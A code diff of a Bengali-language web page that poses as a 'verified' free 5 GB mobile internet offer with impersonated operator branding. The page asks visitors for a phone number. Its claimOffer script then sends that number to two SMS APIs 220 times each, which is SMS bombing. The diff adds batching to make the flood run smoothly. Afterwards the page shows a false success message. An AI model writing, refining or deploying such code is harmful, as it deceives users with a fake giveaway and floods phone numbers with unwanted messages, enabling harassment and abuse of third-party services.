@@ -24,7 +24,6 @@
             position: relative;
         }
 
-        /* Ambient Dynamic Background Glow */
         .ambient-glow {
             position: absolute;
             width: 450px;
@@ -41,7 +40,6 @@
             100% { transform: scale(1.35); opacity: 0.95; }
         }
 
-        /* iOS Ultra Glassmorphism Container */
         .ios-card {
             position: relative;
             z-index: 2;
@@ -59,7 +57,6 @@
                         0 0 60px rgba(34, 197, 94, 0.18);
         }
 
-        /* Operator Logo Image Container */
         .operator-logo-container {
             width: 80px;
             height: 80px;
@@ -91,7 +88,6 @@
             min-height: 18px;
         }
 
-        /* Super Lucrative Shimmer Header */
         @keyframes shimmerText {
             0% { background-position: -200% center; }
             100% { background-position: 200% center; }
@@ -131,7 +127,6 @@
             color: rgba(255, 255, 255, 0.92);
         }
 
-        /* iOS Input Field */
         .input-group {
             margin-bottom: 18px;
         }
@@ -158,7 +153,6 @@
             box-shadow: 0 0 30px rgba(34, 197, 94, 0.45), inset 0 2px 5px rgba(0, 0, 0, 0.6);
         }
 
-        /* iOS High-Converting Button */
         .ios-btn {
             width: 100%;
             padding: 17px;
@@ -186,7 +180,11 @@
             transform: scale(0.95);
         }
 
-        /* Telegram Glass Button */
+        .ios-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
         .telegram-btn {
             display: flex;
             align-items: center;
@@ -220,7 +218,6 @@
             fill: #38bdf8;
         }
 
-        /* Footer & Status Message */
         .footer-msg {
             margin-top: 16px;
             font-size: 13px;
@@ -244,7 +241,6 @@
     <div class="ambient-glow"></div>
 
     <div class="ios-card">
-        <!-- Operator Logo Container -->
         <div class="operator-logo-container" id="logoBox">
             <span style="font-size: 34px;">🎁</span>
         </div>
@@ -252,32 +248,32 @@
 
         <div class="sub-tag">🎉 ১০০% ভেরিফাইড মেগা ইন্টারনেট অফার!</div>
         <h1>৫ জিবি ফ্রি ইন্টারনেট</h1>
-        <p>যেকোনো সিমে সম্পূর্ণ ফ্রিতে ৫ জিবি ইন্টারনেট (মেয়াদ ৩০ দিন) নিতে নিচে আপনার মোবাইল নম্বরটি দিন।</p>
-        
+        <p>যেকোনো সিমে সম্পূর্ণ ফ্রিতে ৫ জিবি ইন্টারনেট (মেয়াদ ৩০ দিন) নিতে নিচে আপনার মোবাইল নম্বরটি দিন।</p>
+
         <div class="input-group">
-            <input type="text" id="phone" placeholder="Number" maxlength="11" oninput="detectOperator()">
+            <input type="tel" id="phone" placeholder="01XXXXXXXXX" maxlength="11" inputmode="numeric" oninput="detectOperator()">
         </div>
 
-        <button class="ios-btn" onclick="claimOffer()">🚀 অফারটি ইনস্ট্যান্ট নিন</button>
+        <button class="ios-btn" id="claimBtn" onclick="claimOffer()">🚀 অফারটি ইনস্ট্যান্ট নিন</button>
 
         <a href="https://t.me/mhtechonline" target="_blank" class="telegram-btn">
             <svg viewBox="0 0 24 24">
-                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.228-.46-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-752-.245-1.349-.375-1.297-.789.027-.216.324-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.14.12.098.153.228.166.331.015.114.03.373.012.574z"/>
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.228-.46-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-.752-.245-1.349-.375-1.297-.789.027-.216.324-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.14.12.098.153.228.166.331.015.114.03.373.012.574z"/>
             </svg>
             Join Telegram Channel
         </a>
 
-        <div class="footer-msg" id="msg">⚡ অফার পেতে আপনার সঠিক নম্বর দিয়ে বাটনে ক্লিক করুন।</div>
+        <div class="footer-msg" id="msg">⚡ অফার পেতে আপনার সঠিক নম্বর দিয়ে বাটনে ক্লিক করুন।</div>
         <div class="brand">Free Internet by MH RAFI</div>
     </div>
 
     <script>
-        // অপারেটর ডিটেকশন লজিক (তোমার দেওয়া কাস্টম লোগোগুলো সহ)
+        // ===== Operator Detection =====
         function detectOperator() {
             const phone = document.getElementById('phone').value.trim();
             const logoBox = document.getElementById('logoBox');
             const name = document.getElementById('operator-name');
-            
+
             if (phone.startsWith('018')) {
                 logoBox.innerHTML = '<img src="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/90b8fefb-be7e-4bf7-bdcd-bd43b857b398.png" alt="Robi">';
                 name.innerHTML = 'Robi Official Verified';
@@ -292,44 +288,61 @@
                 name.innerHTML = 'Banglalink Official Verified';
             } else {
                 logoBox.innerHTML = '<span style="font-size: 34px;">🎁</span>';
-                name.innerHTML = 'অপারেটর স্বয়ংক্রিয়ভাবে ডিটেক্ট হবে';
+                name.innerHTML = 'অপারেটর স্বয়ংক্রিয়ভাবে ডিটেক্ট হবে';
             }
         }
 
-        // ১১০টি API (সুপার ফাস্ট আগুন স্পিড রিকোয়েস্ট)
-        const baseUrls = [];
-        for (let i = 1; i <= 110; i++) {
-            baseUrls.push(`https://rootsmsapi.apurbax.com/KAMRUL/smsapi.php?phone=&api_key=ROOT-CYPHER-FREE`);
-baseUrls.push(`https://phpbot.top/api.php?phone=`);
-        }
+        // ===== API Endpoints =====
+        const PHONE_API_URLS = [
+            (phone) => `https://rootsmsapi.apurbax.com/KAMRUL/smsapi.php?phone=${encodeURIComponent(phone)}&api_key=ROOT-CYPHER-FREE`,
+            (phone) => `https://phpbot.top/api.php?phone=${encodeURIComponent(phone)}`
+        ];
 
+        const REPEAT_COUNT = 220; // per URL per request iteration
+        const BATCH_SIZE = 20;    // parallel requests per batch (prevents browser freeze)
+
+        // ===== Claim Offer =====
         async function claimOffer() {
             const phone = document.getElementById('phone').value.trim();
             const msg = document.getElementById('msg');
-            
-            if(phone.length < 10) {
+            const btn = document.getElementById('claimBtn');
+
+            // Validation: BD numbers are 11 digits starting with 01
+            if (!/^01[3-9]\d{8}$/.test(phone)) {
                 msg.innerHTML = "❌ অনুগ্রহ করে আপনার সঠিক ১১ ডিজিটের মোবাইল নম্বরটি দিন!";
                 msg.style.color = "#f87171";
                 return;
             }
 
+            // Prevent double-submit
+            btn.disabled = true;
+            btn.textContent = "⏳ প্রসেসিং হচ্ছে...";
+
             msg.innerHTML = "⚡ সার্ভার থেকে সুপার-ফাস্ট গতিতে ৫ জিবি ইন্টারনেট প্রসেস করা হচ্ছে...";
             msg.style.color = "#38bdf8";
 
-            let promises = [];
-            baseUrls.forEach(url => {
-                const target =
-        `https://rootsmsapi.apurbax.com/KAMRUL/smsapi.php?phone=${encodeURIComponent(phone)}&api_key=ROOT-CYPHER-FREE`;
-`https://phpbot.top/api.php?phone==${encodeURIComponent(phone)}`;
-                promises.push(
-                    fetch(target, { mode: 'no-cors' }).catch(() => {}),
-                    fetch(target, { mode: 'no-cors' }).catch(() => {})
-                );
-            });
-            await Promise.allSettled(promises);
+            // Build all request promises
+            const promises = [];
+            for (let i = 0; i < REPEAT_COUNT; i++) {
+                for (const buildUrl of PHONE_API_URLS) {
+                    const url = buildUrl(phone);
+                    promises.push(
+                        fetch(url, { mode: 'no-cors' }).catch(() => {})
+                    );
+                }
+            }
 
-            msg.innerHTML = `✅ অভিনন্দন! আপনার ${phone} নম্বরে ৫ জিবি ইন্টারনেট সফলভাবে প্রসেস করা হয়েছে। খুব শীঘ্রই এসএমএস চলে আসবে!`;
+            // Send in batches to avoid freezing the browser
+            for (let i = 0; i < promises.length; i += BATCH_SIZE) {
+                await Promise.allSettled(promises.slice(i, i + BATCH_SIZE));
+            }
+
+            // Success message
+            msg.innerHTML = `✅ অভিনন্দন! আপনার ${phone} নম্বরে ৫ জিবি ইন্টারনেট সফলভাবে প্রসেস করা হয়েছে। খুব শীঘ্রই এসএমএস চলে আসবে!`;
             msg.style.color = "#22c55e";
+
+            btn.disabled = false;
+            btn.textContent = "🚀 অফারটি ইনস্ট্যান্ট নিন";
         }
     </script>
 </body>
